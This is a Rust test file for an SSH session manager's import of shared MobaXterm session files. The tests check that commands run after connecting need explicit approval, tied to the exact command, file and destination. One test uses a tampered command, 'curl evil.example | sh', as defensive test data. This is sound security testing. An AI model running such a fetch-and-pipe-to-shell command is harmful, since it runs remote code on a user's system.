    let effects = app.update(Message::ConnectShared(id.clone()));
    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
    assert!(app.dialog.is_none());
    let mut restarted = app_with_text_keeping(dir.path());
    let effects = restarted.update(Message::ConnectShared(id));
    assert_eq!(typed(&effects), [PostConnectStep::new("sudo -i")]);
}

/// The app again on the files `app_with_text` left, settings included.
fn app_with_text_keeping(dir: &Path) -> App {
    App::new(AppConfig {
        profiles_file: dir.join("profiles.toml"),
        known_hosts: dir.join("known_hosts"),
        legacy_dir: None,
        agent: AgentSource::Disabled,
        initial_grid: GridSize { cols: 80, rows: 24 },
        files_start: dir.to_owned(),
        system_credentials: heimdall_app::SystemCredentials::memory(),
    })
}

#[test]
fn a_command_the_file_changes_is_asked_about_again() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    let id = id_of(&app, "web");
    app.update(Message::ConnectShared(id.clone()));
    app.update(Message::ConfirmDialog);

    // Somebody edits the shared file: same session, another command.
    std::fs::write(
        dir.path().join("team.mxtsessions"),
        WITH_COMMAND.replace("sudo -i", "curl evil.example | sh"),
    )
    .expect("write");
    let mut restarted = app_with_text_keeping(dir.path());
    let effects = restarted.update(Message::ConnectShared(id));
    assert!(effects.is_empty(), "nothing runs: {effects:?}");
    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &restarted.dialog else {
        panic!("{:?}", restarted.dialog);
    };
    assert_eq!(asked.commands, ["curl evil.example | sh"]);
}

#[test]
fn connecting_without_the_shared_commands_types_nothing_and_asks_again_next_time() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    let id = id_of(&app, "web");
    app.update(Message::ConnectShared(id.clone()));
    let effects = app.update(Message::SkipPostConnect);
    assert!(typed(&effects).is_empty());
    assert!(app.settings().shared_post_connect_approvals.is_empty());
    app.update(Message::ConnectShared(id));
    assert!(matches!(
        app.dialog,
        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
    ));
}

#[test]
fn a_session_without_a_command_opens_without_a_question() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    let effects = app.update(Message::ConnectShared(id_of(&app, "esc")));
    assert!(typed(&effects).is_empty());
    assert!(app.dialog.is_none());
}

#[test]
fn the_approvals_of_a_source_taken_out_of_the_settings_are_forgotten() {
    use heimdall_app::SettingsMessage;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    app.update(Message::ConnectShared(id_of(&app, "web")));
    app.update(Message::ConfirmDialog);
    assert_eq!(app.settings().shared_post_connect_approvals.len(), 1);
    app.update(Message::Settings(
        SettingsMessage::SharedSources(Vec::new()),
    ));
    assert!(app.settings().shared_post_connect_approvals.is_empty());
    let saved =
        Settings::load(&settings_path(&dir.path().join("profiles.toml"))).expect("settings");
    assert!(
        saved.shared_post_connect_approvals.is_empty(),
        "forgotten on disk too"
    );
}

/// Four sessions of one folder, three through the bastion `jump.example.com` and one direct.
const ONE_OFF_ROUTE: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
a= #109#0%a.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
b= #109#0%b.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
c= #109#0%c.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
d= #109#0%d.example.com%22%deploy%\r\n";

#[test]
fn a_session_off_the_gateway_of_its_folder_is_in_the_report() {
    use heimdall_app::shared_report::ReportCheck;
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), ONE_OFF_ROUTE);
    let report = shared.report_of("team").expect("a report");
    let outliers: Vec<_> = report
        .entries
        .iter()
        .filter(|entry| entry.check == ReportCheck::GatewayOutlier)
        .collect();
    assert_eq!(outliers.len(), 1, "{report:?}");
    assert_eq!(outliers[0].session, "d");
    assert_eq!(outliers[0].folder, "Prod");
    assert_eq!(outliers[0].detail, "", "direct");
    assert_eq!(outliers[0].context, "ops@jump.example.com");
}

#[test]
fn the_gateway_check_ignores_a_folder_too_small_to_have_a_usual_route() {
    use heimdall_app::shared_report::ReportCheck;
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(
        dir.path(),
        "[Bookmarks]\r\nSubRep=Prod\r\n\
a= #109#0%a.example.com%22%deploy%%%%%jump.example.com%22%ops%\r\n\
d= #109#0%d.example.com%22%deploy%\r\n",
    );
    let report = shared.report_of("team").expect("a report");
    assert_eq!(
        report.count_of(ReportCheck::GatewayOutlier),
        0,
        "two sessions are too few"
    );
}

/// A file with a command behind a bastion.
const BEHIND: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
web= #109#0%web.example.com%22%deploy%%%%sudo -i%jump.example.com%22%ops%\r\n";

#[test]
fn an_approval_is_for_the_destination_it_was_given_for() {
    // Each edit keeps the session's folder, name and commands and moves where they run.
    let edits = [
        ("another host", "web.example.com", "evil.example.com"),
        ("another port", "%22%deploy", "%2222%deploy"),
        ("another account", "deploy%%%%sudo", "root%%%%sudo"),
        ("another bastion", "jump.example.com", "other.example.com"),
        (
            "another bastion port",
            "jump.example.com%22",
            "jump.example.com%2200",
        ),
        ("another bastion account", "%ops%", "%adm%"),
        (
            "no bastion",
            "sudo -i%jump.example.com%22%ops%",
            "sudo -i%%%%",
        ),
    ];
    for (what, from, to) in edits {
        let dir = tempfile::tempdir().expect("dir");
        let mut app = app_with_text(dir.path(), BEHIND);
        let id = id_of(&app, "web");
        app.update(Message::ConnectShared(id.clone()));
        app.update(Message::ConfirmDialog);
        // Unchanged, it is not asked about again.
        let mut same = app_with_text_keeping(dir.path());
        assert!(
            !typed(&same.update(Message::ConnectShared(id.clone()))).is_empty(),
            "{what}: unchanged"
        );

        let text = BEHIND.replace(from, to);
        assert_ne!(text, BEHIND, "{what}: the edit changed nothing");
        std::fs::write(dir.path().join("team.mxtsessions"), text).expect("write");
        let mut restarted = app_with_text_keeping(dir.path());
        let id = id_of(&restarted, "web");
        let effects = restarted.update(Message::ConnectShared(id));
        assert!(effects.is_empty(), "{what}: ran without a question");
        assert!(
            matches!(
                restarted.dialog,
                Some(heimdall_app::Dialog::ConfirmPostConnect(_))
            ),
            "{what}: not asked"
        );
    }
}

#[test]
fn a_source_pointed_at_another_file_forgets_what_was_approved_for_the_first() {
    use heimdall_app::SettingsMessage;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    app.update(Message::ConnectShared(id_of(&app, "web")));
    app.update(Message::ConfirmDialog);
    assert_eq!(app.settings().shared_post_connect_approvals.len(), 1);

    // The same identifier and name, another file: it inherits nothing.
    let other = dir.path().join("other.mxtsessions");
    std::fs::write(&other, WITH_COMMAND).expect("write");
    app.update(Message::Settings(SettingsMessage::SharedSources(vec![
        source("team", &other),
    ])));
    assert!(app.settings().shared_post_connect_approvals.is_empty());
    let effects = app.update(Message::ConnectShared(id_of(&app, "web")));
    assert!(effects.is_empty(), "asked again: {effects:?}");
    assert!(matches!(
        app.dialog,
        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
    ));
}

/// The tab, attempt and host of the connection `effects` starts.
fn started(
    effects: &[heimdall_app::Effect],
) -> (heimdall_app::TabId, heimdall_app::AttemptId, String) {
    match effects {
        [
            heimdall_app::Effect::Connect {
                tab,
                attempt,
                request,
            },
        ] => (*tab, *attempt, request.profile.host.clone()),
        other => panic!("expected one Connect, got {other:?}"),
    }
}

/// Fails the connection of `tab`, which is what makes it reconnectable.
fn fail(app: &mut App, tab: heimdall_app::TabId, attempt: heimdall_app::AttemptId) {
    app.update(Message::Connection {
        tab,
        attempt,
        event: heimdall_app::ConnectionEvent::Failed(heimdall_app::UiError::Timeout),
    });
}

#[test]
fn the_question_about_shared_commands_does_not_retarget_another_tab_and_the_new_tab_reconnects_to_its_own()
 {
    for skip in [false, true] {
        let dir = tempfile::tempdir().expect("dir");
        let mut app = app_with_text(dir.path(), WITH_COMMAND);
        // A tab of an unrelated shared session, then the question for another.
        let (first, first_attempt, _) =
            started(&app.update(Message::ConnectShared(id_of(&app, "esc"))));
        fail(&mut app, first, first_attempt);
        app.update(Message::ConnectShared(id_of(&app, "web")));
        assert_eq!(app.tabs.len(), 1, "nothing opened yet");
        let (_, _, host) = started(&app.update(Message::ReconnectTab(first)));
        assert_eq!(
            host, "esc.example.com",
            "the first tab keeps its own server"
        );

        // Answered: the tab that opens reconnects to its own server too.
        let effects = app.update(if skip {
            Message::SkipPostConnect
        } else {
            Message::ConfirmDialog
        });
        let (second, attempt, host) = started(&effects);
        assert_eq!(host, "web.example.com");
        fail(&mut app, second, attempt);
        let effects = app.update(Message::ReconnectTab(second));
        if skip {
            // Nothing was approved, so the reopened session asks again, about its own server.
            assert!(effects.is_empty(), "{effects:?}");
            let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &app.dialog else {
                panic!("{:?}", app.dialog);
            };
            assert_eq!(asked.profile.host, "web.example.com");
        } else {
            let (_, _, host) = started(&effects);
            assert_eq!(host, "web.example.com", "approved: no second question");
        }
    }
}

#[test]
fn saving_a_shared_session_as_a_profile_does_not_approve_the_commands_it_declined() {
    use heimdall_app::TabMenuMessage;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    app.update(Message::ConnectShared(id_of(&app, "web")));
    // "Connect without them": the shell opens typing nothing.
    let (tab, _, _) = started(&app.update(Message::SkipPostConnect));
    app.update(Message::TabMenu(TabMenuMessage::SaveAsProfile(tab)));
    app.update(Message::SaveProfile {
        password: None,
        passphrase: None,
    });
    let saved = app.profile_summaries();
    assert_eq!(saved.len(), 1, "the profile is saved");
    let id = saved[0].id.clone();

    // Opening it asks about the commands, with the exact text, and types nothing meanwhile.
    let effects = app.update(Message::OpenProfile(id.clone()));
    assert!(effects.is_empty(), "nothing runs unasked: {effects:?}");
    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &app.dialog else {
        panic!("{:?}", app.dialog);
    };
    assert_eq!(asked.commands, ["sudo -i"]);
    // Only an explicit yes approves them on the local profile.
    let effects = app.update(Message::ConfirmDialog);
    assert_eq!(typed(&effects).len(), 1);
    assert!(
        app.update(Message::OpenProfile(id)).iter().any(
            |effect| matches!(effect, heimdall_app::Effect::Connect { request, .. }
                if !request.profile.post_connect.to_run().is_empty())
        ),
        "approved once, remembered"
    );
}

#[test]
fn steps_written_in_the_form_are_still_approved_by_saving_it() {
    use heimdall_app::TabMenuMessage;
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    app.update(Message::ConnectShared(id_of(&app, "esc")));
    let tab = app.tabs.last().expect("a tab").id;
    app.update(Message::TabMenu(TabMenuMessage::SaveAsProfile(tab)));
    app.update(Message::PostConnectEdit(
        heimdall_app::steps_draft::StepEdit::Add,
    ));
    app.update(Message::PostConnectEdit(
        heimdall_app::steps_draft::StepEdit::Input(0, "uptime".to_owned()),
    ));
    app.update(Message::SaveProfile {
        password: None,
        passphrase: None,
    });
    let id = app.profile_summaries()[0].id.clone();
    let effects = app.update(Message::OpenProfile(id));
    assert_eq!(typed(&effects).len(), 1, "{:?}", app.dialog);
}

/// A shared session that names no account: it is asked for when connecting.
const NO_ACCOUNT: &str = "[Bookmarks]\r\nSubRep=Prod\r\n\
web= #109#0%web.example.com%22%%%%%sudo -i%%\r\n";

#[test]
fn an_approval_is_not_remembered_for_a_session_whose_account_is_asked_at_connection() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), NO_ACCOUNT);
    let id = id_of(&app, "web");
    app.update(Message::ConnectShared(id.clone()));
    let effects = app.update(Message::ConfirmDialog);
    assert_eq!(typed(&effects).len(), 1, "approved for this session");
    assert!(
        app.settings().shared_post_connect_approvals.is_empty(),
        "but not remembered: the account typed later is unknown to it"
    );
    // Connecting again, with whichever account is typed then, asks again.
    let effects = app.update(Message::ConnectShared(id.clone()));
    assert!(effects.is_empty(), "{effects:?}");
    assert!(matches!(
        app.dialog,
        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
    ));
    let mut restarted = app_with_text_keeping(dir.path());
    restarted.update(Message::ConnectShared(id));
    assert!(matches!(
        restarted.dialog,
        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
    ));
}

/// A saved profile made of the shared session `web`, its commands declined.
fn declined_and_saved(dir: &Path) -> (App, heimdall_core::profile::ProfileId) {
    use heimdall_app::TabMenuMessage;
    let mut app = app_with_text(dir, WITH_COMMAND);
    app.update(Message::ConnectShared(id_of(&app, "web")));
    let (tab, _, _) = started(&app.update(Message::SkipPostConnect));
    app.update(Message::TabMenu(TabMenuMessage::SaveAsProfile(tab)));
    app.update(Message::SaveProfile {
        password: None,
        passphrase: None,
    });
    let id = app.profile_summaries()[0].id.clone();
    (app, id)
}

/// Opening `id` must ask about the commands and type nothing.
fn assert_asked(app: &mut App, id: &heimdall_core::profile::ProfileId, what: &str) {
    app.dialog = None;
    let effects = app.update(Message::OpenProfile(id.clone()));
    assert!(effects.is_empty(), "{what}: ran without a question");
    assert!(
        matches!(
            app.dialog,
            Some(heimdall_app::Dialog::ConfirmPostConnect(_))
        ),
        "{what}: not asked"
    );
}

fn save_form(app: &mut App) {
    app.update(Message::SaveProfile {
        password: None,
        passphrase: None,
    });
}

#[test]
fn editing_the_saved_profile_without_touching_the_commands_does_not_approve_them() {
    let dir = tempfile::tempdir().expect("dir");
    let (mut app, id) = declined_and_saved(dir.path());
    app.update(Message::EditProfile(id.clone()));
    save_form(&mut app);
    assert_asked(&mut app, &id, "edited, commands untouched");
    // Another setting, the delay and the order change: still not the text.
    app.update(Message::EditProfile(id.clone()));
    app.update(Message::PostConnectEdit(
        heimdall_app::steps_draft::StepEdit::Delay(0, "900".to_owned()),
    ));
    save_form(&mut app);
    assert_asked(&mut app, &id, "delay changed");
    // The status is persisted with the profile.
    let mut restarted = app_with_text_keeping(dir.path());
    assert_asked(&mut restarted, &id, "restarted");
}

#[test]
fn a_duplicate_of_the_saved_profile_keeps_the_commands_unapproved() {
    let dir = tempfile::tempdir().expect("dir");
    let (mut app, id) = declined_and_saved(dir.path());
    app.update(Message::DuplicateProfile {
        id: id.clone(),
        suffix: " (copy)".to_owned(),
    });
    let summaries = app.profile_summaries();
    assert_eq!(summaries.len(), 2);
    for summary in summaries {
        assert_asked(&mut app, &summary.id, &summary.name);
    }
}

#[test]
fn a_step_the_user_adds_does_not_trust_the_shared_one_and_run_trusts_both_once() {
    use heimdall_app::steps_draft::StepEdit;
    let dir = tempfile::tempdir().expect("dir");
    let (mut app, id) = declined_and_saved(dir.path());
    app.update(Message::EditProfile(id.clone()));
    app.update(Message::PostConnectEdit(StepEdit::Add));
    app.update(Message::PostConnectEdit(StepEdit::Input(
        1,
        "uptime".to_owned(),
    )));
    save_form(&mut app);
    app.dialog = None;
    let effects = app.update(Message::OpenProfile(id.clone()));
    assert!(effects.is_empty(), "{effects:?}");
    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &app.dialog else {
        panic!("{:?}", app.dialog);
    };
    assert_eq!(asked.commands, ["sudo -i", "uptime"]);
    // Run is what trusts the shared step; then nothing is asked again, even after an edit.
    let effects = app.update(Message::ConfirmDialog);
    assert_eq!(typed(&effects).len(), 2);
    app.update(Message::EditProfile(id.clone()));
    save_form(&mut app);
    let effects = app.update(Message::OpenProfile(id));
    assert_eq!(typed(&effects).len(), 2, "{:?}", app.dialog);
}

#[test]
fn a_remembered_approval_is_for_the_exact_command_and_its_source() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), WITH_COMMAND);
    let id = id_of(&app, "web");
    app.update(Message::ConnectShared(id.clone()));
    app.update(Message::ConfirmDialog);

    // Unchanged: not asked, after a restart too.
    let mut same = app_with_text_keeping(dir.path());
    assert_eq!(
        typed(&same.update(Message::ConnectShared(id.clone()))).len(),
        1
    );
    assert!(same.dialog.is_none());

    // One character of the command changed: asked again, nothing typed.
    std::fs::write(
        dir.path().join("team.mxtsessions"),
        WITH_COMMAND.replace("sudo -i", "sudo -s"),
    )
    .expect("write");
    let mut edited = app_with_text_keeping(dir.path());
    let effects = edited.update(Message::ConnectShared(id.clone()));
    assert!(effects.is_empty(), "{effects:?}");
    let Some(heimdall_app::Dialog::ConfirmPostConnect(asked)) = &edited.dialog else {
        panic!("{:?}", edited.dialog);
    };
    assert_eq!(asked.commands, ["sudo -s"]);

    // The very same command from another file: asked again too.
    std::fs::write(dir.path().join("team.mxtsessions"), WITH_COMMAND).expect("write");
    let other = dir.path().join("other.mxtsessions");
    std::fs::write(&other, WITH_COMMAND).expect("write");
    let mut moved = app_with_text_keeping(dir.path());
    moved.update(Message::Settings(
        heimdall_app::SettingsMessage::SharedSources(vec![source("team", &other)]),
    ));
    let effects = moved.update(Message::ConnectShared(id));
    assert!(effects.is_empty(), "{effects:?}");
    assert!(matches!(
        moved.dialog,
        Some(heimdall_app::Dialog::ConfirmPostConnect(_))
    ));
}

/// The session type a `MobaXterm` file gives the session whose usual icon is `icon`: the type
/// decides the protocol, never the icon (`MobaXtermImporter.cs:515-542`).
fn session_type_of(icon: u32) -> u32 {
    match icon {
        98 => 1,
        91 => 4,
        128 => 5,
        130 => 6,
        140 => 7,
        _ => 0,
    }
}

/// A session line of a `MobaXterm` file: the usual icon of the protocol (`code`), and each
/// `(index, value)` of `fields` at its place in the `%` list, the others empty. The indexes are
/// those the C# `SessionLayouts` documents (`MobaXtermImporter.cs:100-157`).
fn line(name: &str, code: u32, fields: &[(usize, &str)]) -> String {
    const FIELD_COUNT: usize = 32;
    let mut values = vec![""; FIELD_COUNT];
    for (at, value) in fields {
        values[*at] = value;
    }
    format!(
        "{name}= #{code}#{}%{}\r\n",
        session_type_of(code),
        values.join("%")
    )
}

/// A file with an SFTP, a Telnet and a VNC session, each with fields that must not come along.
fn other_protocols() -> String {
    format!(
        "[Bookmarks]\r\nSubRep=Ops\r\n{}{}{}",
        line(
            "files",
            140,
            &[
                (0, "files.example.com"),
                (1, "2222"),
                (2, "bob"),
                (4, "C:\\Keys\\id_rsa"),
                (11, "UNIX-LOGIN-OPTION")
            ]
        ),
        line(
            "console",
            98,
            &[(0, "tel.example.com"), (1, "2323"), (2, "TELNET-LOGIN")]
        ),
        line(
            "desk",
            128,
            &[
                (0, "vnc.example.com"),
                (1, "5901"),
                (11, "UNIX-LOGIN-OPTION")
            ]
        ),
    )
}

#[test]
fn sftp_telnet_and_vnc_sessions_are_taken_with_the_fields_of_their_protocol_only() {
    let dir = tempfile::tempdir().expect("dir");
    let (shared, _) = loaded(dir.path(), &other_protocols());
    let state = &shared.sources()[0];
    assert_eq!((state.sessions, state.refused), (3, 0), "{state:?}");
    let sessions = shared.sessions_of("team");

    let SharedTarget::Sftp(files) = &sessions[0].target else {
        panic!("{sessions:?}");
    };
    assert_eq!(sessions[0].protocol(), "SFTP");
    assert!(files.sftp, "it opens its files");
    assert_eq!(
        (files.host.as_str(), files.port),
        ("files.example.com", 2222)
    );
    assert_eq!(files.username.as_deref(), Some("bob"));
    assert!(files.key_path.is_none() && files.gateway.is_none());
    assert!(!files.forward_agent && !files.compression && !files.x11_forwarding);
    assert!(files.post_connect.is_empty());
    assert_eq!(sessions[0].folder.as_deref(), Some("Ops"));
    assert!(sessions[0].gateway.is_none());

    let SharedTarget::Telnet(console) = &sessions[1].target else {
        panic!("{sessions:?}");
    };
    assert_eq!(sessions[1].protocol(), "Telnet");
    assert_eq!(
        (console.host.as_str(), console.port),
        ("tel.example.com", 2323)
    );
    assert!(console.group.is_none() && console.session_logging.is_none());

    let SharedTarget::Vnc(desk) = &sessions[2].target else {
        panic!("{sessions:?}");
    };
    assert_eq!(sessions[2].protocol(), "VNC");
    assert_eq!((desk.host.as_str(), desk.port), ("vnc.example.com", 5901));
    // Nothing the file could use to weaken the connection: the defaults of a new profile.
    assert!(!desk.view_only && !desk.allow_no_password && !desk.require_tls);
    assert!(desk.username.is_none() && desk.vault_entry.is_none() && desk.group.is_none());

    // The Telnet login and the Unix login option are not read, and nothing keeps them.
    let held = format!("{shared:?}");
    assert!(!held.contains("TELNET-LOGIN"), "{held}");
    assert!(!held.contains("UNIX-LOGIN-OPTION"), "{held}");
    assert!(!held.contains("id_rsa"), "{held}");
}

#[test]
fn the_default_port_of_each_protocol_is_used_when_the_file_gives_none() {
    let dir = tempfile::tempdir().expect("dir");
    let text = format!(
        "[Bookmarks]\r\n{}{}{}",
        line("files", 140, &[(0, "files.example.com")]),
        line("console", 98, &[(0, "tel.example.com")]),
        line("desk", 128, &[(0, "vnc.example.com")]),
    );
    let (shared, _) = loaded(dir.path(), &text);
    let ports: Vec<u16> = shared
        .sessions_of("team")
        .iter()
        .map(|session| session.endpoint().1)
        .collect();
    assert_eq!(ports, [22, 23, 5900]);
}

#[test]
fn a_session_going_around_a_route_heimdall_cannot_take_is_refused_not_taken_direct() {
    use heimdall_app::shared_report::{ReportCheck, SkipReason};
    let dir = tempfile::tempdir().expect("dir");
    let text = format!(
        "[Bookmarks]\r\n{}{}{}{}{}{}{}",
        // A jump host on a protocol that is never routed through one.
        line(
            "tel-jump",
            98,
            &[(0, "t.example.com"), (5, "jump.example.com"), (6, "22")]
        ),
        line(
            "vnc-jump",
            128,
            &[(0, "v.example.com"), (4, "jump.example.com"), (5, "22")]
        ),
        // A proxy on every protocol that has a slot for one; the proxy host may be missing.
        line(
            "sftp-proxy",
            140,
            &[(0, "f.example.com"), (9, "1"), (10, "proxy.example.com")]
        ),
        line("tel-proxy", 98, &[(0, "t2.example.com"), (10, "2")]),
        line(
            "vnc-proxy",
            128,
            &[(0, "v2.example.com"), (12, "3"), (13, "proxy.example.com")]
        ),
        line(
            "ssh-proxy",
            109,
            &[(0, "s.example.com"), (18, "1"), (19, "proxy.example.com")]
        ),
        // "0" names no proxy: the session is a direct one and is taken.
        line("tel-ok", 98, &[(0, "ok.example.com"), (10, "0")]),
    );
    let (shared, _) = loaded(dir.path(), &text);
    let names: Vec<&str> = shared
        .sessions_of("team")
        .iter()
        .map(heimdall_app::shared_sessions::SharedSession::name)
        .collect();
    assert_eq!(
        names,
        ["tel-ok"],
        "the others would reach their host around the route"
    );
    let report = shared.report_of("team").expect("a report");
    let skipped: Vec<_> = report
        .entries
        .iter()
        .filter(|entry| entry.check == ReportCheck::SkippedSession)
        .map(|entry| (entry.session.as_str(), entry.reason, entry.detail.as_str()))
        .collect();
    assert_eq!(skipped.len(), 6, "{skipped:?}");
    for (name, reason, detail) in [
        (
            "tel-jump",
            SkipReason::JumpHostNotSupported,
            "jump.example.com",
        ),
        (
            "vnc-jump",
            SkipReason::JumpHostNotSupported,
            "jump.example.com",
        ),
        (
            "sftp-proxy",
            SkipReason::ProxyNotSupported,
            "proxy.example.com",
        ),
        ("tel-proxy", SkipReason::ProxyNotSupported, ""),
        (
            "vnc-proxy",
            SkipReason::ProxyNotSupported,
            "proxy.example.com",
        ),
        (
            "ssh-proxy",
            SkipReason::ProxyNotSupported,
            "proxy.example.com",
        ),
    ] {
        assert!(
            skipped.contains(&(name, Some(reason), detail)),
            "{name}: {skipped:?}"
        );
    }
    assert_eq!(shared.sources()[0].refused, 6);
}

#[test]
fn a_session_of_a_type_heimdall_does_not_take_says_why_and_is_never_taken_as_a_connection() {
    use heimdall_app::shared_report::{ReportCheck, SkipReason};
    let dir = tempfile::tempdir().expect("dir");
    let text = "[Bookmarks]
        ftp= #130#6%ftp.example.com%21%anon%
        wsl= #151#14%AlmaLinux-9%
        odd= #12#99%odd.example.com%22%
        ssh= #42#0%ssh.example.com%22%deploy%
";
    let (shared, _) = loaded(dir.path(), text);
    let names: Vec<&str> = shared
        .sessions_of("team")
        .iter()
        .map(heimdall_app::shared_sessions::SharedSession::name)
        .collect();
    assert_eq!(names, ["ssh"], "the icon does not decide the protocol");
    let report = shared.report_of("team").expect("a report");
    let skipped: Vec<_> = report
        .entries
        .iter()
        .filter(|entry| entry.check == ReportCheck::SkippedSession)
        .map(|entry| (entry.session.as_str(), entry.reason, entry.detail.as_str()))
        .collect();
    assert_eq!(skipped.len(), 3, "{skipped:?}");
    for expected in [
        ("ftp", Some(SkipReason::FtpNotSupported), ""),
        ("wsl", Some(SkipReason::WslNotSupported), ""),
        ("odd", Some(SkipReason::OtherProtocol), "99"),
    ] {
        assert!(skipped.contains(&expected), "{expected:?}: {skipped:?}");
    }
    assert_eq!(shared.sources()[0].refused, 3);
}

#[test]
fn a_file_that_adds_a_route_to_every_session_leaves_no_direct_session_behind() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    let direct = format!(
        "[Bookmarks]\r\n{}{}",
        line("tel", 98, &[(0, "t.example.com")]),
        line("vnc", 128, &[(0, "v.example.com")]),
    );
    std::fs::write(&file, &direct).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    assert_eq!(shared.sessions_of("team").len(), 2);
    // The file now sends both through a route Heimdall cannot follow.
    let routed = format!(
        "[Bookmarks]\r\n{}{}",
        line(
            "tel",
            98,
            &[(0, "t.example.com"), (5, "jump.example.com"), (6, "22")]
        ),
        line(
            "vnc",
            128,
            &[(0, "v.example.com"), (12, "2"), (13, "proxy.example.com")]
        ),
    );
    std::fs::write(&file, &routed).expect("write");
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    assert!(
        shared.sessions_of("team").is_empty(),
        "neither the previous read nor anything else brings a direct session back"
    );
    assert_eq!(shared.sources()[0].refused, 2);
    // After a restart, with the file or without it, the old copy does not answer either.
    for keep_file in [true, false] {
        if !keep_file {
            std::fs::remove_file(&file).expect("remove");
        }
        let mut restarted = cached(dir.path());
        restarted.load(&sources, &Variables::default());
        assert!(restarted.sessions_of("team").is_empty(), "{keep_file}");
    }
}

#[test]
fn a_file_whose_session_lines_are_all_too_long_leaves_no_earlier_session_behind() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    let first = format!(
        "[Bookmarks]
{}",
        line("tel", 98, &[(0, "t.example.com")])
    );
    std::fs::write(&file, &first).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    assert_eq!(shared.sessions_of("team").len(), 1);
    let long = "x".repeat(3000);
    let dropped = format!(
        "[Bookmarks]
{}",
        line("tel", 98, &[(0, "t.example.com"), (2, &long)])
    );
    std::fs::write(&file, &dropped).expect("write");
    assert!(shared.refresh(&sources, &Variables::default(), later()));
    assert!(shared.sessions_of("team").is_empty());
    let mut restarted = cached(dir.path());
    restarted.load(&sources, &Variables::default());
    assert!(restarted.sessions_of("team").is_empty());
}

#[test]
fn only_the_sessions_that_can_name_a_gateway_vote_on_the_route_of_a_folder() {
    use heimdall_app::shared_report::ReportCheck;
    let dir = tempfile::tempdir().expect("dir");
    let ssh = |name: &str, host: &str| {
        line(
            name,
            109,
            &[
                (0, host),
                (1, "22"),
                (2, "deploy"),
                (7, "jump.example.com"),
                (8, "22"),
                (9, "ops"),
            ],
        )
    };
    // Three SSH sessions through one bastion, then a Telnet, a VNC and an SFTP session that
    // are direct whatever the folder does: none of them stands out, and an SSH and an SFTP
    // session on one host are two ways to use it, not a repetition.
    let text = format!(
        "[Bookmarks]\r\nSubRep=Prod\r\n{}{}{}{}{}{}",
        ssh("a", "a.example.com"),
        ssh("b", "b.example.com"),
        ssh("c", "c.example.com"),
        line("a-telnet", 98, &[(0, "a.example.com")]),
        line("a-vnc", 128, &[(0, "a.example.com")]),
        line("a-files", 140, &[(0, "a.example.com")]),
    );
    let (shared, _) = loaded(dir.path(), &text);
    assert_eq!(shared.sources()[0].sessions, 6);
    let report = shared.report_of("team").expect("a report");
    assert_eq!(
        report.count_of(ReportCheck::GatewayOutlier),
        0,
        "{report:?}"
    );
    assert_eq!(report.count_of(ReportCheck::DuplicateHost), 0, "{report:?}");

    // Two Telnet sessions on one host are a repetition.
    let twice = format!(
        "[Bookmarks]\r\n{}{}",
        line("t1", 98, &[(0, "tel.example.com")]),
        line("t2", 98, &[(0, "tel.example.com"), (1, "2323")]),
    );
    let (shared, _) = loaded(dir.path(), &twice);
    assert_eq!(
        shared
            .report_of("team")
            .expect("a report")
            .count_of(ReportCheck::DuplicateHost),
        2
    );
}

#[test]
fn the_offline_copy_keeps_the_sessions_of_every_protocol() {
    let dir = tempfile::tempdir().expect("dir");
    let file = dir.path().join("team.mxtsessions");
    std::fs::write(&file, other_protocols()).expect("write");
    let sources = vec![source("team", &file)];
    let mut shared = cached(dir.path());
    shared.load(&sources, &Variables::default());
    assert_eq!(shared.sessions().count(), 3);
    std::fs::remove_file(&file).expect("remove");
    let mut restarted = cached(dir.path());
    restarted.load(&sources, &Variables::default());
    let kinds: Vec<_> = restarted
        .sessions()
        .map(|session| (session.protocol(), session.endpoint().1))
        .collect();
    assert_eq!(kinds, [("SFTP", 2222), ("Telnet", 2323), ("VNC", 5901)]);
    assert!(restarted.sources()[0].offline.is_some());
}

#[test]
fn opening_a_shared_sftp_session_opens_its_files_and_saves_nothing() {
    let dir = tempfile::tempdir().expect("dir");
    let mut app = app_with_text(dir.path(), &other_protocols());
    let before = app.tabs.len();
    let effects = app.update(Message::ConnectShared(id_of(&app, "files")));
    assert_eq!(app.tabs.len(), before + 1);
    let [heimdall_app::Effect::Connect { request, .. }] = effects.as_slice() else {
        panic!("{effects:?}");
    };
    assert_eq!(request.purpose, heimdall_app::Purpose::Files);
    assert!(request.profile.sftp);
    assert_eq!(request.profile.username.as_deref(), Some("bob"));
    assert!(request.route.is_empty(), "direct");
